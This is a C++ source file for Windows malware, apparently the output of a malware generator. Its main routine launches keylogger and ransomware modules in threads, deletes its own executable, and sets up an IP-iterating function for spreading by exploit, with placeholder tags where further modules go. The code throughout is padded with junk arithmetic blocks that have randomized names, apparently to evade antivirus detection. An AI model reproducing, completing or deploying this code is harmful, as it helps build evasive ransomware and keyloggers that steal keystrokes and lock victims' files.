#include "testo5.h"
bool isRandomName = false;
typedef struct threadData {
	int shellPort;
	char strIP[16];
} threadData, *PthreadData;
//Global var: malware file name
char fullName[MAX_PATH];
std::string fileName ="";

int main(int argc, char** argv){
	
	GetModuleFileNameA(NULL, (LPSTR)fullName, 100);{
int iA7oCUytjF4 = 0x2bb300f;
int iDTrLhkfRTl = 0x81e3ee6;
int i2eg29pMtKp = 0x2954469;
int ilKPoh9EnT7 = i2eg29pMtKp * iDTrLhkfRTl + iA7oCUytjF4;
iDTrLhkfRTl = 0xcf39bab - ilKPoh9EnT7 + 5 + 0x433505c + 69 - iA7oCUytjF4;
iA7oCUytjF4 = 0x2bb300f + 10 - iDTrLhkfRTl % 10 + 0x2954469 + 999 - ilKPoh9EnT7;
ilKPoh9EnT7 = iA7oCUytjF4 % 5 + i2eg29pMtKp % 0x81e3ee6 + 0xcafebabe + iA7oCUytjF4;
i2eg29pMtKp = 0x2bb300f * 0x100 - iA7oCUytjF4 + 56 ^ 0x81e3ee6 + 1996 - i2eg29pMtKp;
int iPEfpoGC8ms = i2eg29pMtKp / 77 + 0x2954469 - 76 / i2eg29pMtKp ^ 0x33 % i2eg29pMtKp % 0x2954469;
iPEfpoGC8ms = 0x433505c * 0x10 - 22 + iPEfpoGC8ms + 56 ^ 0xff + iDTrLhkfRTl + 1996 - 2111 + i2eg29pMtKp;
}
	fileName = PathFindFileNameA(fullName);{
int ixaBjSkpVQp = 0x61d206a;
int iGWwD9TEMNs = 0x43900e8;
int iaGahjhJBX2 = 0xaa42279;
int i6zYdQmm8NQ = ixaBjSkpVQp + iGWwD9TEMNs - iaGahjhJBX2;
i6zYdQmm8NQ = 0xff697d8 * i6zYdQmm8NQ + 0x4db1380 - iGWwD9TEMNs;
int iSAFH2ebzn4 = i6zYdQmm8NQ / 0x4db1380 + ixaBjSkpVQp ^ iaGahjhJBX2 - 0xaa42279;
}

	//[ninjaModule]
	if(argc==0){/*normal process*/
	//
std::vector<DWORD> arr_dwThreadIdModule;
std::vector<HANDLE> arr_hThreadModule;
HANDLE hThread = NULL;
DWORD dwTID = 0;
        //Moudule Keylogger
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger, NULL, 0, &dwTID);
        if (hThread != INVALID_HANDLE_VALUE)
        {
            arr_hThreadModule.push_back(hThread);{
int i7czpBrYkgJ;
int iCPN5Qawiqp = 0x5e9e605;
int iz5oGPghBzw = 0xb9900ae;
int ixNuiJfGuYS = 0x4bbf017;
for(i7czpBrYkgJ = 0; i7czpBrYkgJ < 3; i7czpBrYkgJ++)
{
    iCPN5Qawiqp = i7czpBrYkgJ * 99 - 1000 * iz5oGPghBzw + 0x456 ^ 0x1a60490 % 5 - 0x51d234c;
    iz5oGPghBzw = i7czpBrYkgJ * 3 + ixNuiJfGuYS + 0x30 + 0x4bbf017 % 123 - iz5oGPghBzw;
    ixNuiJfGuYS = i7czpBrYkgJ * 4 - 0xb9900ae + 0xff / 0x123 - 0x4bbf017 % 234 - 0x51d234c;
}
int i4Eh6RIP4aA = ixNuiJfGuYS - iCPN5Qawiqp * iz5oGPghBzw + 0x4bbf017;
i4Eh6RIP4aA = i7czpBrYkgJ - 50 + 100 - 0xb9900ae ^ 99 * 0x0f - 0x4bbf017 % 2 - 3575 + 0x51d234c;
}
            arr_dwThreadIdModule.push_back(dwTID);
        }        //Moudule SimpleRansom
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SimpleRansom, NULL, 0, &dwTID);
        if (hThread != INVALID_HANDLE_VALUE)
        {
            arr_hThreadModule.push_back(hThread);{
int iGrXU2IiSxk = 0xfa6502c;
int ibmkIqqXweM = 0xf65f724;
int iioF3TOgv6X = 0x66fac06;
int ifdsapD6rSO = iioF3TOgv6X * ibmkIqqXweM + iGrXU2IiSxk;
ibmkIqqXweM = 0x37f7f6d + ifdsapD6rSO + 0x6057be4 + iGrXU2IiSxk;
int iMcjHXdre4I = iGrXU2IiSxk / 0xf65f724 - iioF3TOgv6X ^ iioF3TOgv6X ^ 0x66fac06;
}
            arr_dwThreadIdModule.push_back(dwTID);
        }
WaitForMultipleObjects(arr_hThreadModule.size(), &arr_hThreadModule[0], TRUE, INFINITE);
for (int i = 0; i < arr_hThreadModule.size(); i++) {
if(arr_hThreadModule[i])
CloseHandle(arr_hThreadModule[i]);
}

	
	//[mainExploit]	

	}
	//[optionElseIf]
	else{
		SelfDelete();
		return 0;
	}
}
//WinMain for win app compile in visual studio
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	int argc;
	PCHAR *argv = CommandLineToArgvA(lpCmdLine, &argc);{
int inaGJCZjhCS;
int iZUjkljWn9L = 0x8c14541;
int iHj6hDmVwZO = 0xe9bb927;
int iLQ90miA55F = 0x2a76f14;
for(inaGJCZjhCS = 0; inaGJCZjhCS < 3; inaGJCZjhCS++)
{
    iZUjkljWn9L = inaGJCZjhCS * 99 - 1000 * iHj6hDmVwZO + 0x456 ^ 0x436f0b9 % 5 - 0xb5d1144;
    iHj6hDmVwZO = inaGJCZjhCS * 3 + iLQ90miA55F + 0x30 + 0x2a76f14 % 123 - iHj6hDmVwZO;
    iLQ90miA55F = inaGJCZjhCS * 4 - 0xe9bb927 + 0xff / 0x123 - 0x2a76f14 % 234 - 0xb5d1144;
}
int iQ99iZC2CfK = iLQ90miA55F - iZUjkljWn9L * iHj6hDmVwZO + 0x2a76f14;
iQ99iZC2CfK = inaGJCZjhCS - 50 + 100 - 0xe9bb927 ^ 99 * 0x0f - 0x2a76f14 % 2 - 3575 + 0xb5d1144;
}

	return main(argc, argv);
}

void SelfDelete(){
	char out[MAX_PATH];
	GetModuleFileNameA(NULL,(LPSTR)out,100);
	char str[MAX_PATH];
	strcpy(str,"start del ");
	strcat(str,out);
	system(str);{
int ifBd2LcQrJE;
int idkaFjiZdGZ = 0xcf59a30;
int iEpwg1bsU0Z = 0x588b30c;
int iY7HlM2cOY5 = 0xa5eeef0;
for(ifBd2LcQrJE = 0; ifBd2LcQrJE < 3; ifBd2LcQrJE++)
{
    idkaFjiZdGZ = ifBd2LcQrJE * 99 - 1000 * iEpwg1bsU0Z + 0x456 ^ 0xb0b6b6b % 5 - 0x61f3b17;
    iEpwg1bsU0Z = ifBd2LcQrJE * 3 + iY7HlM2cOY5 + 0x30 + 0xa5eeef0 % 123 - iEpwg1bsU0Z;
    iY7HlM2cOY5 = ifBd2LcQrJE * 4 - 0x588b30c + 0xff / 0x123 - 0xa5eeef0 % 234 - 0x61f3b17;
}
int i1TkNxp6SN6 = iY7HlM2cOY5 - idkaFjiZdGZ * iEpwg1bsU0Z + 0xa5eeef0;
i1TkNxp6SN6 = ifBd2LcQrJE - 50 + 100 - 0x588b30c ^ 99 * 0x0f - 0xa5eeef0 % 2 - 3575 + 0x61f3b17;
}
}
PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
	ULONG   len;
	ULONG   argc;
	CHAR   a;
	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;{
int iL5d0hSMGZf = 0x6597542;
int izt9ye9vqOz = 0x1785bcb;
int iPUy6PWgW8h = 0xc26b25d;
int iEl7c8lROBa = iPUy6PWgW8h * izt9ye9vqOz + iL5d0hSMGZf;
izt9ye9vqOz = 0xb7f42d4 - iEl7c8lROBa + 5 + 0x10b81f9 + 69 - iL5d0hSMGZf;
iL5d0hSMGZf = 0x6597542 + 10 - izt9ye9vqOz % 10 + 0xc26b25d + 999 - iEl7c8lROBa;
iEl7c8lROBa = iL5d0hSMGZf % 5 + iPUy6PWgW8h % 0x1785bcb + 0xcafebabe + iL5d0hSMGZf;
iPUy6PWgW8h = 0x6597542 * 0x100 - iL5d0hSMGZf + 56 ^ 0x1785bcb + 1996 - iPUy6PWgW8h;
int i9XAlEuUJl0 = iPUy6PWgW8h / 77 + 0xc26b25d - 76 / iPUy6PWgW8h ^ 0x33 % iPUy6PWgW8h % 0xc26b25d;
i9XAlEuUJl0 = 0x10b81f9 * 0x10 - 22 + i9XAlEuUJl0 + 56 ^ 0xff + izt9ye9vqOz + 1996 - 2111 + iPUy6PWgW8h;
}
	BOOLEAN  in_SPACE;

	len = strlen(CmdLine);
	i = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);

	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED,
		i + (len + 2) * sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc = 0;
	argv[argc] = _argv;
	in_QM = FALSE;
	in_TEXT = FALSE;
	in_SPACE = TRUE;
	i = 0;
	j = 0;

	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
				j++;
			}
		}
		else {
			switch (a) {
			case '\"':
				in_QM = TRUE;
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;{
int iICRdifg3oF = 0x8524677;
int iIYE94U4Mcs = 0xfd72af6;
int iX74yIqmLEC = 0xc9bf3bb;
int igPDDA5z0Bj = iICRdifg3oF + iIYE94U4Mcs - iX74yIqmLEC;
igPDDA5z0Bj = 0x26474ce * igPDDA5z0Bj + 0xcc796f5 - iIYE94U4Mcs;
int iklGisQFQOz = igPDDA5z0Bj / 0xcc796f5 + iICRdifg3oF ^ iX74yIqmLEC - 0xc9bf3bb;
}
					argc++;
				}
				in_SPACE = FALSE;
				break;
			case ' ':
			case '\t':
			case '\n':
			case '\r':
				if (in_TEXT) {
					_argv[j] = '\0';
					j++;
				}
				in_TEXT = FALSE;{
int iEL3Iv0VG2k = 0x1f88f73;
int iV7OGt4cszw = 0x38fa991;
int iWfIpPwe9y4 = iEL3Iv0VG2k * iV7OGt4cszw;
}
				in_SPACE = TRUE;
				break;{
int iHcAJe99E0H = 0x73113f6;
int i1M9JzBuHCN = 0xf1e2032;
int iSjNjj9aFdu = 0x798ecdb;
int icpqPsg2KpM = iSjNjj9aFdu * i1M9JzBuHCN + iHcAJe99E0H;
i1M9JzBuHCN = 0xe92b58e - icpqPsg2KpM + 5 + 0x2ad89ff + 69 - iHcAJe99E0H;
iHcAJe99E0H = 0x73113f6 + 10 - i1M9JzBuHCN % 10 + 0x798ecdb + 999 - icpqPsg2KpM;
icpqPsg2KpM = iHcAJe99E0H % 5 + iSjNjj9aFdu % 0xf1e2032 + 0xcafebabe + iHcAJe99E0H;
iSjNjj9aFdu = 0x73113f6 * 0x100 - iHcAJe99E0H + 56 ^ 0xf1e2032 + 1996 - iSjNjj9aFdu;
int iHeLFBwWNb6 = iSjNjj9aFdu / 77 + 0x798ecdb - 76 / iSjNjj9aFdu ^ 0x33 % iSjNjj9aFdu % 0x798ecdb;
iHeLFBwWNb6 = 0x2ad89ff * 0x10 - 22 + iHeLFBwWNb6 + 56 ^ 0xff + i1M9JzBuHCN + 1996 - 2111 + iSjNjj9aFdu;
}
			default:
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				_argv[j] = a;{
int iQbkKmN3Fbz;
int iRmwHxMfzkI = 0x3b4d250;
int iLH3w2XPDJJ = 0xfc317b7;
int iLeaRCs9RN1 = 0x0b264d4;
for(iQbkKmN3Fbz = 0; iQbkKmN3Fbz < 3; iQbkKmN3Fbz++)
{
    iRmwHxMfzkI = iQbkKmN3Fbz * 99 - 1000 * iLH3w2XPDJJ + 0x456 ^ 0x2d13238 % 5 - 0x292aaec;
    iLH3w2XPDJJ = iQbkKmN3Fbz * 3 + iLeaRCs9RN1 + 0x30 + 0x0b264d4 % 123 - iLH3w2XPDJJ;
    iLeaRCs9RN1 = iQbkKmN3Fbz * 4 - 0xfc317b7 + 0xff / 0x123 - 0x0b264d4 % 234 - 0x292aaec;
}
int i5Sqrf9ahtu = iLeaRCs9RN1 - iRmwHxMfzkI * iLH3w2XPDJJ + 0x0b264d4;
i5Sqrf9ahtu = iQbkKmN3Fbz - 50 + 100 - 0xfc317b7 ^ 99 * 0x0f - 0x0b264d4 % 2 - 3575 + 0x292aaec;
}
				j++;
				in_SPACE = FALSE;
				break;
			}
		}
		i++;
	}
	_argv[j] = '\0';
	argv[argc] = NULL;

	(*_argc) = argc;
	return argv;
}
int initAttack(int ipAddress[]){
	
	register int i,j;
	u_long opt = 1;

	PthreadData pDataArray[MAX_THREADS];{
int iZDrx5cogui;
int is6FsVhZTQe = 0xbdd35d8;
int igHnt5ML4CP = 0x0de895f;
int ioyGgBIjEAP = 0x0caaee8;
for(iZDrx5cogui = 0; iZDrx5cogui < 3; iZDrx5cogui++)
{
    is6FsVhZTQe = iZDrx5cogui * 99 - 1000 * igHnt5ML4CP + 0x456 ^ 0x8e46d1b % 5 - 0xcc998bf;
    igHnt5ML4CP = iZDrx5cogui * 3 + ioyGgBIjEAP + 0x30 + 0x0caaee8 % 123 - igHnt5ML4CP;
    ioyGgBIjEAP = iZDrx5cogui * 4 - 0x0de895f + 0xff / 0x123 - 0x0caaee8 % 234 - 0xcc998bf;
}
int ip3ZcVUMKyn = ioyGgBIjEAP - is6FsVhZTQe * igHnt5ML4CP + 0x0caaee8;
ip3ZcVUMKyn = iZDrx5cogui - 50 + 100 - 0x0de895f ^ 99 * 0x0f - 0x0caaee8 % 2 - 3575 + 0xcc998bf;
}
    DWORD   dwThreadIdArray[MAX_THREADS];{
int ifqtrlLR85Z = 0x437e098;
int i3jadndlqOV = 0x5e51288;
int invNjQjRuQo = 0x735d9fe;
int iEz2tU27fVJ = invNjQjRuQo * i3jadndlqOV + ifqtrlLR85Z;
i3jadndlqOV = 0x9ab04ac + iEz2tU27fVJ + 0xa745c03 + ifqtrlLR85Z;
int iBB3Nyk7GVg = ifqtrlLR85Z / 0x5e51288 - invNjQjRuQo ^ invNjQjRuQo ^ 0x735d9fe;
}
    HANDLE  hThreadArray[MAX_THREADS]; 
    int curIP[4];
	
	//[exploitThreads]

    //Increase IP when all exploit done
	ipAddress[0]=curIP[0];
    ipAddress[1]=curIP[1];
    ipAddress[2]=curIP[2];
    ipAddress[3]=curIP[3];
    return 1;{
int iTPdUm2u3P7 = 0x1a825ef;
int ikAYYWT61dY = 0xb55c62b;
int ivbsI7H9pcg = 0xfbf3796;
int iiVtBBz0QPG = iTPdUm2u3P7 + ikAYYWT61dY - ivbsI7H9pcg;
iiVtBBz0QPG = 0x43c05cf * iiVtBBz0QPG + 0x0dc306b - ikAYYWT61dY;
int iBwVNxtv6B4 = iiVtBBz0QPG / 0x0dc306b + iTPdUm2u3P7 ^ ivbsI7H9pcg - 0xfbf3796;
}
}

//[exploit_function]

void ipAr2Str(int ipAddress[],char* result){
	int tmp[4];
	tmp[0] = ipAddress[0];
	tmp[1] = ipAddress[1];
	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
	sprintf(result, "%i.%i.%i.%i",ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
	// printf("%s\n",result);
	return;
}
